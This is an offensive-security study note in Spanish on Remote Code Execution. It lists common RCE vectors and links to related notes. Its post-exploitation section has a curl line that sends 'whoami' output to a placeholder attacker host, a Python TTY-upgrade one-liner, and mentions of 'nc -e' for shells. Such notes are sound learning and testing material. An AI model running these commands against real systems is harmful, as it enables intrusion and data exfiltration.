---
aliases:
  - RCE
tags:
  - asset/web-app
  - technique/execution
kind: Concept
linked:
  - "[[OS Command Injection]]"
  - "[[Insecure Deserialization]]"
  - "[[Server-Side Template Injection (SSTI)]]"
  - "[[File Upload - Vulnerabilidades]]"
  - "[[LFI To RCE - Log Poisoning]]"
---
# Remote Code Execution

> [!info]
> **RCE** = ejecución de código arbitrario en sistema remoto. Una de las vulnerabilidades de mayor impacto: compromete confidencialidad, integridad y disponibilidad del target.

---

## Resumen

Vector de explotación que permite ejecutar comandos/código en el servidor objetivo desde el atacante. Resultado típico: shell interactivo, persistencia, lateral movement.

---

## Vectores comunes

| Vector | Mecanismo | Notas relacionadas |
|---|---|---|
| **Command Injection** | Input no sanitizado pasado a shell | [[OS Command Injection]] |
| **SQL Injection (RCE)** | `xp_cmdshell`, `INTO OUTFILE`, `sys_eval` | [[SQL - Interacción Especial y Archivos]] |
| **File Upload + Execution** | Webshell PHP/ASP/JSP subido y ejecutado | [[File Upload - Shells en PHP]] |
| **LFI → RCE** | Log poisoning, PHP wrappers, phar deserialization | [[LFI To RCE - Log Poisoning]], [[LFI To RCE - PHP Filter Chains]] |
| **SSTI** | Inyección en template engine (Jinja2, Twig, Freemarker) | [[Server-Side Template Injection (SSTI)]] |
| **Insecure Deserialization** | Gadget chains en PHP/Java/.NET/Python | [[Insecure Deserialization]] |
| **XXE → RCE** | Expect protocol PHP, Java JNDI | [[XML External Entity (XXE)]] |
| **CVE público** | Exploits específicos (Log4Shell, Confluence, etc.) | searchsploit, ExploitDB |
| **SSRF → metadata → RCE** | Cloud metadata leak con permisos | [[SSRF - Cloud Metadata]] |

---

## Detección post-exploit

- Verificar usuario actual: `whoami`, `id`
- Hostname / OS: `hostname`, `uname -a`, `systeminfo`
- Path / privs: `pwd`, `sudo -l`
- Outbound conn check: `curl http://attacker/?$(whoami)`

---

## Estabilización

- [[Reverse Shell]]
- TTY upgrade: `python -c 'import pty;pty.spawn("/bin/bash")'`
- Stable shell: `socat`, `nc -e`, [[Pivoting & Port Forwarding]]

---

## Notas Relacionadas

- [[Reverse Shell]]
- [[Linux Privilege Escalation]]
- [[Windows Privilege Escalation]]
- [[Pivoting & Port Forwarding]]
